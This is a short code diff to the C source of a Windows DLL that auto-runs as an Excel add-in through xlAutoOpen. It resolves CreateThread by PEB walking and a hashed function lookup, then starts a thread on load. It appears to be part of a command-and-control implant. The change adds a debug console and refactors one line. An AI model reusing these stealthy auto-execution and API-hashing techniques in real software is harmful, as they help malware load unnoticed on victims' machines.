@@ -22,6 +22,11 @@ DLLEXPORT INT WINAPI xlAutoOpen(  )
 
 DLLEXPORT VOID Start(  )
 {
+#ifdef DEBUG
+    AllocConsole();
+    freopen("CONOUT$", "w", stdout);
+#endif
+
     PUTS( "Start" )
 
     Instance->Session.ModuleBase = hAppInstance;
@@ -48,9 +53,7 @@ BOOL WINAPI DllMain( HINSTANCE hDllBase, DWORD Reason, LPVOID Reserved )
     {
         case DLL_PROCESS_ATTACH:
         {
-            hAppInstance    = hDllBase;
-
-            PVOID Kernel32  = LdrModulePeb( HASH_KERNEL32 );
+            hAppInstance = hDllBase;
             HANDLE ( WINAPI *NewThread ) (
                     LPSECURITY_ATTRIBUTES,
                     SIZE_T,
@@ -58,7 +61,7 @@ BOOL WINAPI DllMain( HINSTANCE hDllBase, DWORD Reason, LPVOID Reserved )
                     LPVOID,
                     DWORD,
                     LPDWORD
-            ) = LdrFunctionAddr( Kernel32, 0x7f08f451 );
+            ) = LdrFunctionAddr( LdrModulePeb( HASH_KERNEL32 ), 0x7f08f451 );
 
             NewThread( NULL, 0, Start, NULL, 0, NULL );
             break;
